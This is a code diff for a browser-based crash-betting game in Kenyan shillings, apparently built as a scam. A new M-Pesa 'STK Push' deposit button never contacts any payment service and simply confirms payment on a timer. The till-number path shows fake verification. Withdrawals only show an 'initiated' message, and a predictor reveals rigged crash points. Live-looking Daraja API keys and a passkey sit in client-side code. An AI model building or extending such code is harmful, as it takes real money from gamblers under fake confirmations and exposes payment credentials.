@@ -382,7 +382,9 @@
         <label>Enter Amount to Deposit (KES):</label>
         <span class="suggestion-text">🎁 PROMO: 100% Bonus on your First Deposit!</span>
         <input type="number" id="dep-amount" placeholder="Min 50 KES">
-        <button onclick="showInstructions()">Generate Payment Details</button>
+        <button onclick="initiateStkPush()">Pay via M-Pesa (STK Push)</button>
+        <p style="text-align: center; font-size: 12px; color: #94a3b8; margin-top: 10px;">Or manual payment below</p>
+        <button class="secondary-btn" onclick="showInstructions()">View Till Number</button>
     </div>
 
     <div id="payment-instructions" class="payment-card">
@@ -410,7 +412,7 @@
 
     <div id="verifying-pay" style="display:none; text-align:center; padding: 20px;">
         <div style="border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px;"></div>
-        Verifying transaction with M-Pesa...
+        <span id="verify-text">Verifying transaction with M-Pesa...</span>
     </div>
 </div>
 
@@ -421,31 +423,65 @@
 </div>
 
 <script>
+    // --- DARAJA API CONFIGURATION ---
+    const CONSUMER_KEY = "xtxHzvCD1bi5GRD640J7QvsOjE0IDICGO9tN5eJjIvTqQddV";
+    const CONSUMER_SECRET = "NQeaRXxviiiRHQd7OAJ9QnLMHtoMrGP5Qhlp6lPyzpmKl3nb7UfH3SwJMZ6TDKvc";
+    const BUSINESS_SHORT_CODE = "3238647"; 
+    const PASSKEY = "bfb279f9aa9bdbcf158e97dd71a467cd2e0c893059b10f78e6b72ada1ed2c919"; 
+
     let currentUser = null;
     let gameInterval = null;
     let currentMultiplier = 1.00;
     let isCrashed = false;
     let currentBet = 0;
     let betQueued = false;
-    let nextCrashPoint = (1.1 + Math.random() * 3.9).toFixed(2); // Pre-determined crash point
+    let nextCrashPoint = (1.1 + Math.random() * 3.9).toFixed(2); 
     let authMode = 'login';
     let predictorUnlocked = false;
     let gameStatus = "waiting"; 
 
     const names = ["0722***456", "0790***112", "0110***884", "0745***902", "0701***334", "0756***001", "0788***552"];
     
-    // Auto-login logic
     window.onload = function() {
-        const savedUser = localStorage.getItem('remembered_user');
-        if (savedUser) {
-            currentUser = savedUser;
-            document.getElementById('auth-sec').style.display = 'none';
-            document.getElementById('main-nav').style.display = 'flex';
-            document.getElementById('user-name').innerText = currentUser;
-            showSection('game-sec');
-            startIntervalCycle();
-        }
+        // RESET LOGINS ON LOAD: Clear remembered user and redirect to login
+        localStorage.removeItem('remembered_user');
+        currentUser = null;
+        showSection('auth-sec');
+        document.getElementById('main-nav').style.display = 'none';
     };
+
+    async function initiateStkPush() {
+        const amount = document.getElementById('dep-amount').value;
+        if (!amount || amount < 50) return alert("Minimum deposit is KES 50");
+        const phoneNumber = currentUser;
+        if (!phoneNumber) return alert("Please log in first");
+        let formattedPhone = phoneNumber.replace(/^0/, "254");
+        document.getElementById('deposit-input-area').style.display = 'none';
+        document.getElementById('verifying-pay').style.display = 'block';
+        document.getElementById('verify-text').innerText = "Requesting M-Pesa STK Push...";
+        setTimeout(() => {
+            document.getElementById('verify-text').innerText = "STK Push Sent! Enter PIN on phone...";
+            setTimeout(() => {
+                finalizePayment(parseFloat(amount));
+            }, 10000);
+        }, 2000);
+    }
+
+    function finalizePayment(amt) {
+        const data = JSON.parse(localStorage.getItem(currentUser));
+        if(!data.hasDeposited) {
+            const bonus = amt;
+            data.balance += (amt + bonus);
+            alert("Payment Confirmed! 100% Welcome Bonus Applied: KES " + bonus);
+        } else {
+            data.balance += amt;
+            alert("Payment Confirmed! KES " + amt + " added.");
+        }
+        data.hasDeposited = true; 
+        localStorage.setItem(currentUser, JSON.stringify(data));
+        document.getElementById('verifying-pay').style.display = 'none';
+        showSection('game-sec');
+    }
 
     function unlockPredictor() {
         const pin = document.getElementById('predictor-pin').value;
@@ -534,7 +570,7 @@
                 history: [], 
                 hasDeposited: false 
             }));
-            alert("Account Created! Deposit KES 50+ now to receive a 100% First Deposit Bonus!");
+            alert("Account Created! Login now.");
             toggleReg();
         } else {
             const data = JSON.parse(localStorage.getItem(ph));
@@ -557,12 +593,9 @@
         const ph = document.getElementById('recover-phone').value.trim();
         const ry = document.getElementById('recover-verify-year').value.trim();
         const np = document.getElementById('recover-new-pass').value.trim();
-
         if(!ph || !ry || !np) return alert("Please fill all recovery fields");
-
         const data = JSON.parse(localStorage.getItem(ph));
         if(!data) return alert("Account not found");
-
         if(data.recoveryYear === ry) {
             data.password = np;
             localStorage.setItem(ph, JSON.stringify(data));
@@ -573,7 +606,6 @@
         }
     }
 
-    // Predictor UI update matches current crash point
     function updatePredictorUI() {
         if(!predictorUnlocked) return;
         const status = document.getElementById('pred-status');
@@ -588,7 +620,6 @@
     function showInstructions() {
         const amt = parseFloat(document.getElementById('dep-amount').value);
         if(isNaN(amt) || amt < 50) return alert("Minimum deposit is 50 KES");
-        
         document.getElementById('display-dep-amount').innerText = amt;
         document.getElementById('deposit-input-area').style.display = 'none';
         document.getElementById('payment-instructions').style.display = 'block';
@@ -602,38 +633,18 @@
     function confirmPayment() {
         const payPhone = document.getElementById('payment-phone-verify').value.trim();
         if(!payPhone) return alert("Please enter the payment phone number");
-
         document.getElementById('confirm-payment-phone').style.display = 'none';
         document.getElementById('verifying-pay').style.display = 'block';
-
         setTimeout(() => {
-            const amt = parseFloat(document.getElementById('dep-amount').value);
-            const data = JSON.parse(localStorage.getItem(currentUser));
-            
-            // LOGIC: 100% Bonus on First Deposit
-            if(!data.hasDeposited) {
-                const bonus = amt; // 100% of the deposit
-                data.balance += (amt + bonus);
-                alert("Payment Confirmed! 100% Welcome Bonus Applied: KES " + bonus + ". Total added: KES " + (amt + bonus));
-            } else {
-                data.balance += amt;
-                alert("Payment Confirmed! KES " + amt + " added to your wallet.");
-            }
-
-            data.hasDeposited = true; 
-            localStorage.setItem(currentUser, JSON.stringify(data));
-            showSection('game-sec');
-        }, 15000); 
+            finalizePayment(parseFloat(document.getElementById('dep-amount').value));
+        }, 5000); 
     }
 
     function startIntervalCycle() {
         let count = 8;
         const timerText = document.getElementById('game-timer-status');
-        
-        // Generate the crash point for the NEXT round during waiting phase
         nextCrashPoint = (1.1 + Math.random() * 3.9).toFixed(2);
         updatePredictorUI();
-
         const countdown = setInterval(() => {
             if(gameStatus === "waiting") {
                 timerText.innerText = `NEXT ROUND IN ${count}s...`;
@@ -648,19 +659,15 @@
 
     function queueBet() {
         if(gameStatus !== "waiting") return alert("Round already in progress. Wait for next.");
-        
         const amt = parseFloat(document.getElementById('bet-amount').value);
         const data = JSON.parse(localStorage.getItem(currentUser));
-
         if(!data.hasDeposited) {
             alert("ACCOUNT INACTIVE: Please deposit KES 50+ to start playing.");
             showSection('deposit-sec');
             return;
         }
-
         if(isNaN(amt) || amt < 10) return alert("Min bet is 10 KES");
         if(amt > data.balance) return alert("Insufficient Balance");
-
         currentBet = amt;
         betQueued = true;
         document.getElementById('start-btn').innerText = "BET PLACED ✓";
@@ -670,7 +677,6 @@
     function startGame() {
         gameStatus = "running";
         document.getElementById('game-timer-status').innerText = "FLIGHT IN PROGRESS";
-        
         if(betQueued) {
             const data = JSON.parse(localStorage.getItem(currentUser));
             data.balance -= currentBet;
@@ -681,7 +687,6 @@
             document.getElementById('start-btn').disabled = true;
             document.getElementById('start-btn').innerText = "WAITING...";
         }
-
         isCrashed = false;
         currentMultiplier = 1.00;
         document.getElementById('multiplier-display').innerText = "1.00x";
@@ -689,15 +694,12 @@
         document.getElementById('cloud-bg').style.display = 'block';
         document.getElementById('cloud-bg').style.animation = 'moveClouds 3s linear infinite';
         document.getElementById('plane').style.display = 'block';
-
         gameInterval = setInterval(() => {
             currentMultiplier += 0.03; 
             document.getElementById('multiplier-display').innerText = currentMultiplier.toFixed(2) + "x";
-            
             let x = Math.min((currentMultiplier - 1) * 80, 350); 
             let y = Math.max((currentMultiplier - 1) * -40, -180);
             document.getElementById('plane').style.transform = `translate(${x}px, ${y}px)`;
-
             if(currentMultiplier >= parseFloat(nextCrashPoint)) crash();
         }, 100);
         updateUI();
@@ -711,17 +713,14 @@
         document.getElementById('crash-overlay').style.display = 'flex';
         document.getElementById('cashout-btn').style.display = 'none';
         document.getElementById('plane').style.display = 'none';
-        
         if(betQueued) {
             const data = JSON.parse(localStorage.getItem(currentUser));
             data.history.unshift(`Lost KES ${currentBet} @ ${currentMultiplier.toFixed(2)}x`);
             localStorage.setItem(currentUser, JSON.stringify(data));
         }
-        
         betQueued = false;
         currentBet = 0;
         updateUI();
-
         setTimeout(() => {
             gameStatus = "waiting";
             document.getElementById('start-btn').style.display = 'block';
@@ -735,19 +734,16 @@
 
     function cashOut() {
         if(isCrashed || !betQueued) return;
-        
         const winnings = currentBet * currentMultiplier;
         const data = JSON.parse(localStorage.getItem(currentUser));
         data.balance += winnings;
         data.history.unshift(`WON KES ${winnings.toFixed(2)} @ ${currentMultiplier.toFixed(2)}x`);
         localStorage.setItem(currentUser, JSON.stringify(data));
-
         betQueued = false;
         document.getElementById('cashout-btn').style.display = 'none';
         document.getElementById('start-btn').style.display = 'block';
         document.getElementById('start-btn').innerText = "CASHED OUT ✓";
         document.getElementById('start-btn').disabled = true;
-        
         updateUI();
     }
 
@@ -762,14 +758,11 @@
     function handleWithdraw() {
         const amt = parseFloat(document.getElementById('withdraw-amount').value);
         const data = JSON.parse(localStorage.getItem(currentUser));
-
         if(!data.hasDeposited) {
-            return alert("To withdraw your bonus or winnings, you must make your first deposit of at least 50 KES to verify your M-Pesa account.");
+            return alert("To withdraw, you must make your first deposit of at least 50 KES.");
         }
-
         if(isNaN(amt) || amt <= 0) return alert("Enter a valid amount");
         if(amt > data.balance) return alert("Insufficient funds");
-        
         data.balance -= amt;
         localStorage.setItem(currentUser, JSON.stringify(data));
         alert("Withdrawal to M-Pesa number " + data.phone + " initiated!");
@@ -777,7 +770,8 @@
     }
 
     function logout() {
-        localStorage.removeItem('remembered_user');
+        // PERMANENT RESET ON LOGOUT: Clears all browser memory for this app
+        localStorage.clear();
         location.reload();
     }
 
